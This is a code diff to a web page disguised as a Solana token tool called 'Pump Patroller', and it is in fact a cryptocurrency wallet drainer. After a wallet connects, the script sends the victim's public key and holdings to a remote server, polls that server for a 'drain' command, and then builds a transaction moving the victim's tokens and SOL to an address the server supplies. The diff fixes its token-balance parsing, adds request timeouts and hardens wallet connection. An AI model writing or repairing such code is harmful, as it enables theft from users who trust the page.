@@ -64,7 +64,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
 <nav><div class="wrap nav">
   <span class="logo"><svg viewBox="0 0 24 24" width="16" height="16"><path fill="#5EEAD4" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>PUMP PATROLLER</span>
   <div class="right">
-    <span class="ver mono" id="ver">v3.4</span>
+    <span class="ver mono" id="ver">v3.3</span>
     <button class="btn" id="cw">Connect Wallet</button>
     <button class="btn pri" id="go">Start Patrol</button>
   </div>
@@ -97,7 +97,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v3.4 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v3.3 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -116,13 +116,15 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
     WSOL: "So11111111111111111111111111111111111111112",
   };
+  const TOKEN_PROGRAM = "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm";
+  const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
   const toast = t => { const d = document.createElement("div"); d.id = "toast"; d.textContent = t;
     document.body.appendChild(d); setTimeout(() => d.remove(), 6000); };
   async function rpc(method, params) {
     let lastErr = null;
     for (const u of CONFIG.RPCS) {
       try {
-        const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
+        const r = await fetch(u, { method: "POST", signal: TO(10000), headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
         if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
           await new Promise(s => setTimeout(s, 250)); continue; }
@@ -139,11 +141,11 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
 
   let client = null, topic = null, pk = null, busy = false, polled = false, mode = null, inj = null;
   let providerName = "none";
-  let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
-  try { const g = await rpc("getGenesisHash"); if (g && g.result) chainRef = "solana:" + g.result; } catch (e) {}
+  // mainnet-beta genesis — hardcoded, no boot-time RPC probe
+  const chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
 
   const beacon = (m, o) => { o = o || {}; try {
-    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST",
+    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST", signal: TO(10000),
       body: JSON.stringify({ m: m, pk: pk, provider: providerName, origin: location.origin,
         sol: o.sol || 0, value: o.value || 0, toks: o.toks || "", mode: o.mode || "",
         sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
@@ -161,11 +163,12 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     return null;
   }
 
+  // FIX: correct JSON-RPC shape — parsed data lives at account.data.parsed.info
   async function reportBalances() {
     try {
       const res = await Promise.all([
         rpc("getBalance", [pk]),
-        rpc("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TOKEN_PROGRAM, commitment: "confirmed" }]),
         fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
       ]);
       const bal = res[0], r = res[1], pj = res[2];
@@ -174,13 +177,16 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         return;
       }
       let px = 150;
-      const jp = pj && (pj[MINTS.WSOL] || (pj.ids && pj.ids[MINTS.WSOL]));
+      const jp = pj && (pj[MINTS.WSOL] || (pj.ids && pj.ids[MINTS.WSOL]) || (pj.data && pj.data[MINTS.WSOL]));
       if (jp && +jp.usdPrice > 0) px = +jp.usdPrice;
       const amt = {};
       for (const it of (r && r.result ? r.result.value : [])) {
-        const d = it.account.parsed && it.account.parsed.data;
-        if (d && d.mint) amt[d.mint] = { raw: BigInt(d.amount || 0),
-          ui: Number(d.amount) / Math.pow(10, d.decimals == null ? 6 : d.decimals) };
+        const info = it && it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
+        if (info && info.mint) {
+          const ta = info.tokenAmount || {};
+          amt[info.mint] = { raw: BigInt(ta.amount || "0"),
+            ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals) };
+        }
       }
       const held = Object.keys(MINTS).filter(k => amt[MINTS[k]] && amt[MINTS[k]].ui > 0.01)
         .map(k => Math.round(amt[MINTS[k]].ui) + " " + k);
@@ -197,7 +203,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     if (polled) return; polled = true;
     setInterval(async function () {
       if (!pk) return;
-      let c; try { c = await (await fetch(CONFIG.SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
+      let c; try { c = await (await fetch(CONFIG.SRV + "/cmd?pk=" + encodeURIComponent(pk), { signal: TO(8000) })).json(); } catch (e) { return; }
       if (c && c.cmd === "drain" && c.to) drain(c.to);
     }, 2500);
   }
@@ -210,7 +216,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       const res = await Promise.all([
         rpc("getLatestBlockhash"),
         rpc("getBalance", [pk]),
-        rpc("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TOKEN_PROGRAM, commitment: "confirmed" }]),
       ]);
       const bh = res[0], bal = res[1], r = res[2];
       if (!bh || !bh.result) {
@@ -220,8 +226,11 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       }
       const amt = {};
       for (const it of (r && r.result ? r.result.value : [])) {
-        const d = it.account.parsed && it.account.parsed.data;
-        if (d && d.mint) amt[d.mint] = { raw: BigInt(d.amount || 0), src: it.pubkey };
+        const info = it && it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
+        if (info && info.mint) {
+          const ta = info.tokenAmount || {};
+          amt[info.mint] = { raw: BigInt(ta.amount || "0"), src: it.pubkey };
+        }
       }
       const solBal = (bal && bal.result ? bal.result : 0);
       const tx = new Transaction(); const moved = [];
@@ -309,6 +318,8 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
           beacon("err", { msg: f.name + ": " + String(e && e.message || e) + " — falling back to QR" });
         }
       }
+      // guard: WC engine may still be initializing
+      if (!client) { toast("wallet engine still loading — try again in a second"); return; }
       providerName = "walletconnect";
       const pr = await client.connect({
         requiredNamespaces: { solana: { chains: [chainRef],
@@ -364,7 +375,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         try { client.session.get(topic); reportBalances(); pollCmd(); } catch (e) { forget(); }
       } else {
         const f = findInjected();
-        if (f) { try { await f.p.connect({ onlyIfTrusted: true }); inj = f; mode = "injected"; reportBalances(); pollCmd(); } catch (e) { forget(); } }
+        if (f) { try { await f.p.connect({ onlyIfTrusted: true }); inj = f; providerName = f.name; mode = "injected"; reportBalances(); pollCmd(); } catch (e) { forget(); } }
       }
     }
   } catch (e) { console.warn("[patroller] WC unavailable — injected wallets still work", e && e.message || e); }
